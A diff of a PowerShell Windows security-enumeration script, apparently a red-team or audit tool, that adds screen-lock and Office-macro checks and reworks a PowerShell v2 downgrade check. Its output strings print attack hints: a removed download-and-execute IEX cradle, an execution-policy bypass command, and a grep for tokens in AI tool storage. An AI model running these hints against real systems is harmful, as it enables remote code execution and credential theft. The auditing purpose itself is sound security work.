@@ -72,32 +72,13 @@ if ($isAdmin) {
     Write-Host "[ OK ]   Not running as administrator" -ForegroundColor Green
 }
 
-# Powershell downgrade
-try {
-    $ps2 = Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root -ErrorAction SilentlyContinue
-    $net2 = Get-WindowsOptionalFeature -Online -FeatureName NetFx3 -ErrorAction SilentlyContinue
-    if ($ps2.State -eq 'Enabled' -and $net2.State -eq 'Enabled') {
-        Write-Host "          - [P005] PowerShell downgrade possible (PSv2 + .NET 3.5 present)" -ForegroundColor DarkRed
-        Write-Host "                    powershell -version 2 -ep bypass -c `"IEX (New-Object Net.WebClient).DownloadString('URL')`"" -ForegroundColor DarkGray
-    } else {
-        Write-Host "          - PowerShell downgrade not possible" -ForegroundColor Green
-    }
-} catch {
-    Write-Host "          - PowerShell downgrade requires more privs" -ForegroundColor DarkGray
-}
-
-# Token Impersonation
-if ($isAdmin) {
-    try {
-        $processes = Get-Process | Where-Object { $_.SessionId -gt 0 }
-        if ($processes.Count -gt 1) {
-            Write-Host "          - [P010] Token impersonation might be possible: https://github.com/Shac0x/Invoke-Totem" -ForegroundColor DarkRed
-        }
-    } catch {
-        Write-Host "          - Token enumeration for impersonation failed" -ForegroundColor DarkYellow
-    }
+# PowerShell downgrade
+$actualVersion = powershell -version 2 -command "[int]`$PSVersionTable.PSVersion.Major" 2>&1
+if (($actualVersion | ForEach-Object { "$_" }) -join "" -match "^2") {
+    Write-Host "[P005]   PowerShell v2 downgrade possible" -ForegroundColor DarkRed
+    Write-Host "          - powershell -version 2 -ExecutionPolicy Bypass -File fkad.ps1" -ForegroundColor DarkGray
 } else {
-    Write-Host "          - Token impersonation requires more privs" -ForegroundColor DarkGray
+    Write-Host "[ OK ]   PowerShell downgrade not possible (PSv2 blocked)" -ForegroundColor Green
 }
 
 # Language Mode Check
@@ -1026,10 +1007,48 @@ foreach ($tool in $aiTools.Keys) {
 }
 
 if ($foundAI.Count -gt 0) {
-    Write-Host "[P200]   Enterprise AI tool storage found: $($foundAI -join ', ') → ai_*_storage" -ForegroundColor DarkRed
+    Write-Host "[P200]   Enterprise AI tool storage found: $($foundAI -join ', ') -> ai_*_storage" -ForegroundColor DarkRed
     Write-Host "          - Extract tokens from .ldb files: strings *.ldb | grep -i 'token\|bearer\|api'" -ForegroundColor DarkGray
 } else {
     Write-Host "[ OK ]   No Enterprise AI tool local storage found" -ForegroundColor Green
+}
+
+Write-Host ""
+
+# Screen Lock Timeout
+$screenTimeout = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name "ScreenSaveTimeOut" -ErrorAction SilentlyContinue).ScreenSaveTimeOut
+$screenSaverActive = (Get-ItemProperty "HKCU:\Control Panel\Desktop" -Name "ScreenSaveActive" -ErrorAction SilentlyContinue).ScreenSaveActive
+if ($screenSaverActive -ne "1") {
+    Write-Host "[P220]   Screen lock/screensaver not configured" -ForegroundColor DarkRed
+} elseif (-not $screenTimeout) {
+    Write-Host "[P220]   Screen lock timeout not set" -ForegroundColor DarkRed
+} elseif ([int]$screenTimeout -gt 900) {
+    Write-Host "[P221]   Screen lock timeout too long: $([int]$screenTimeout / 60) minutes (>15)" -ForegroundColor DarkRed
+} else {
+    Write-Host "[ OK ]   Screen lock timeout: $([int]$screenTimeout / 60) minutes" -ForegroundColor Green
+}
+
+# Office Macro Policy
+$officeVersions = Get-ChildItem "HKCU:\Software\Microsoft\Office" -ErrorAction SilentlyContinue |
+    Where-Object { $_.Name -match '\\[\d]+\.[\d]+$' } |
+    Select-Object -ExpandProperty PSChildName
+$macroApps = @("Word", "Excel", "PowerPoint", "Access")
+$macroFindings = @()
+foreach ($version in $officeVersions) {
+    foreach ($app in $macroApps) {
+        $path = "HKCU:\Software\Microsoft\Office\$version\$app\Security"
+        if (Test-Path $path) {
+            $val = (Get-ItemProperty $path -Name "VBAWarnings" -ErrorAction SilentlyContinue).VBAWarnings
+            if ($val -eq 1 -or $null -eq $val) {
+                $macroFindings += "$app ($version)"
+            }
+        }
+    }
+}
+if ($macroFindings.Count -gt 0) {
+    Write-Host "[P230] Office Macros unrestricted in: $($macroFindings -join ', ')" -ForegroundColor DarkRed
+} else {
+    Write-Host "[ OK ]   Office Macro execution restricted" -ForegroundColor Green
 }
 
 Write-Host ""
